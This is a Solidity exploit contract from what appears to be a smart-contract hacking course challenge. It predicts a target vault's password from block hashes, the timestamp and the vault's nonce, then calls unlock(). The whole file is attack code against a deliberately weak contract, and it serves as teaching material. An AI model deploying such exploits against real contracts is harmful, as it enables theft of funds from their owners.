// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;
interface IVault {
    function nonce() external returns (uint256);
    function unlock(bytes16 _password) external;
}

/**
 * @title AttackGame2
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract Attack_Vault {

    IVault _vault;
    bytes32 private passphrase;
    uint256 public nonce;
    constructor(address _gameAddress) {
        _vault = IVault(_gameAddress);
        passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
        nonce = _vault.nonce();
    }

    function attack(address vaultOwner) external payable {
        
        uint64 ownerPart = uint64(uint160(vaultOwner));
        uint64 secretPart = uint64(_magicPassword());
        bytes16 key = bytes16((uint128(ownerPart) << 64) | secretPart);
        _vault.unlock(key);

    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
}